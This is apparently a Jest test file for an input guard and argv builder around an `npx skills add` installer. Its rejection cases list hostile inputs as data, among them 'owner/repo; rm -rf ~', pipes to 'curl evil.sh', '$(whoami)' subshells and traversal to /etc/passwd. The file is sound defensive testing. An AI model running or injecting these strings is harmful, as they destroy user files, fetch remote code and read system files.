/**
 * Guard + argv spec for the one `npx skills …` spawn in the codebase.
 *
 * Nothing here mocks the guard it is testing: `rejectUnsafeInstallRequest` runs
 * for real, because it is the last thing standing between a user-supplied
 * `owner/repo` and a spawned process argv, and the refactor that introduced the
 * staging directory MOVED it. A guard that is only exercised through a stub is
 * a guard nobody is testing.
 *
 * The argv assertions are the executable version of the module header's
 * measured claims. Verified against `skills@latest` on 2026-08-18 by running
 * the command in an empty directory:
 *   - `--agent claude-code --copy -y` writes real files to
 *     `{cwd}/.claude/skills/<slug>/` plus `{cwd}/skills-lock.json`, and touches
 *     nothing under `$HOME`;
 *   - omitting `--skill` installs every skill in the repo
 *     (`vercel-labs/agent-skills` → 8 slugs);
 *   - there is NO output-directory flag, which is why cwd is the one.
 * If any of those change upstream, `buildSkillInstallArgs` is what has to move.
 */

import {
  buildSkillInstallArgs,
  rejectUnsafeInstallRequest,
  STAGED_SKILLS_REL,
} from './skills-sh-cli';

describe('buildSkillInstallArgs', () => {
  it('pins the measured flag set for a single-skill install', () => {
    expect(
      buildSkillInstallArgs({
        source: 'anthropics/skills',
        skillId: 'frontend-design',
      }),
    ).toEqual([
      'add',
      'anthropics/skills',
      '--skill',
      'frontend-design',
      '--agent',
      'claude-code',
      '--copy',
      '-y',
    ]);
  });

  it('omits --skill to install the whole repo', () => {
    expect(buildSkillInstallArgs({ source: 'anthropics/skills' })).toEqual([
      'add',
      'anthropics/skills',
      '--agent',
      'claude-code',
      '--copy',
      '-y',
    ]);
  });

  it('never passes -g — a staged install is never global', () => {
    const args = buildSkillInstallArgs({ source: 'anthropics/skills' });
    expect(args).not.toContain('-g');
    expect(args).not.toContain('--global');
  });

  it('treats an empty skillId as absent rather than as an empty argument', () => {
    expect(
      buildSkillInstallArgs({ source: 'anthropics/skills', skillId: '' }),
    ).not.toContain('--skill');
  });
});

describe('STAGED_SKILLS_REL', () => {
  it('is where --agent claude-code was measured to write, relative to cwd', () => {
    expect([...STAGED_SKILLS_REL]).toEqual(['.claude', 'skills']);
  });
});

describe('rejectUnsafeInstallRequest', () => {
  it('admits an ordinary owner/repo', () => {
    expect(
      rejectUnsafeInstallRequest({
        source: 'anthropics/skills',
        skillId: 'frontend-design',
      }),
    ).toBeNull();
  });

  it('admits a whole-repo request with no skillId', () => {
    expect(
      rejectUnsafeInstallRequest({ source: 'vercel-labs/agent-skills' }),
    ).toBeNull();
  });

  it.each([
    // `../..` is the load-bearing case: it MATCHES `SAFE_SOURCE_PATTERN`, so
    // only the `isSafePathToken` half inside `parseSourceSlug` rejects it.
    ['traversal that the source regex alone accepts', '../..'],
    ['a dotted owner half', '../repo'],
    ['a dotted repo half', 'owner/..'],
    ['a single-dot half', './repo'],
    ['deeper traversal', '../../../../etc/passwd'],
    ['an absolute path', '/etc/passwd'],
    ['a backslash separator', 'owner\\..\\..\\repo'],
    ['a command separator', 'owner/repo; rm -rf ~'],
    ['a pipe', 'owner/repo | curl evil.sh'],
    ['a subshell', 'owner/$(whoami)'],
    ['a newline', 'owner/repo\nrm -rf ~'],
    ['a flag-shaped source', '--global'],
    ['no separator', 'not-a-slug'],
    ['an empty source', ''],
    ['a bare separator', '/'],
  ])('rejects %s as a source', (_label, source) => {
    expect(rejectUnsafeInstallRequest({ source })).toContain('Invalid source');
  });

  it.each([
    ['bare dot-dot', '..'],
    ['a single dot', '.'],
    ['traversal', '../../evil'],
    ['a path separator', 'skills/frontend-design'],
    ['a backslash', 'skills\\evil'],
    ['a command separator', 'design && curl evil.sh'],
    ['a space', 'frontend design'],
  ])('rejects %s as a skillId', (_label, skillId) => {
    expect(
      rejectUnsafeInstallRequest({ source: 'anthropics/skills', skillId }),
    ).toContain('Invalid skillId');
  });
});
